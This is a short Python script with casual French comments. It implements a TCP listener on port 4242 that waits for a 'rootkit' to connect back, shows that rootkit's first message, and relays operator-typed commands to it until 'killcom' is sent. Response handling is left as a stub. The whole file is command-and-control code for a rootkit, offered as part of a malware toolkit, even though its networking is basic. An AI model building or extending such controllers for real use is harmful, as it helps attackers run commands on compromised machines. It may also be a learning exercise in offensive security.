import socket

# Adresse IP et port sur lesquels le serveur va écouter
HOST = '0.0.0.0'  # 0.0.0.0 = toutes les interfaces réseau
PORT = 4242       # Port d'écoute choisi par sieur Thibounet (on se fend la poire ma foi)

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	# Création d’un socket TCP IPv4
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	# Permet de réutiliser rapidement l’adresse/port après une fermeture
    server_socket.bind((HOST, PORT)) 									# Lier le socket à l’IP et au port choisis
    server_socket.listen(1) 											# Met le socket en mode écoute (1 seule connexion simultanée autorisée ici mais ptetre plus dans l'avenir...)

    print(f"📡 [*] Attente d'une connexion sur {HOST}:{PORT}...")

    # Accepter une connexion entrante (bloque tant qu’aucun client ne se connecte)
    connection, addr = server_socket.accept()
    print(f"✅ [+] Rootkit connecté depuis {addr[0]}")

    try:
        # Lecture du premier message envoyé par le rootkit 1024 octets par convention (c moi la convention)
        data = connection.recv(1024).decode()
        if data:
            print(f"📥 [rootkit] {data.strip()}")

        # Boucle principale : interaction avec le rootkit
        while True:
            try:
                # Lecture de la commande depuis l'utilisateur
                line = input("🧠 Vous > ").strip()
                if not line:
                    continue  # On ignore les lignes vides

                to_send = line + "\n"
                connection.sendall(to_send.encode())  # Envoi de la commande au rootkit
                print(f"📤 [>] Commande envoyée : {line}")

                # Si on envoie "killcom", on ferme proprement
                if 'killcom' in line.lower():
                    print("❌ [-] Fermeture demandée par l'utilisateur.")
                    break

                # 💤 Partie désactivée pour l’instant : attendre une réponse du rootkit
                # A faire quoi parce que pour l'instant c'est oune pocito vide maaais l'idee est la

            except (KeyboardInterrupt, EOFError):
                print("\n⚠️ [!] Interruption utilisateur. Fermeture en cours...")
                break
            except Exception as e:
                print(f"💥 [!] Erreur : {e}") 	# Gestion d'erreur (je gere rien du tout c'est juste un ignoble try/catch)
                break

    finally:
        # Fermeture de la connexion et du socket serveur
        connection.close()
        server_socket.close()
        print("🔒 [*] Connexion fermée. Serveur éteint.")

# Le main quoi
if __name__ == '__main__':
    start_server()
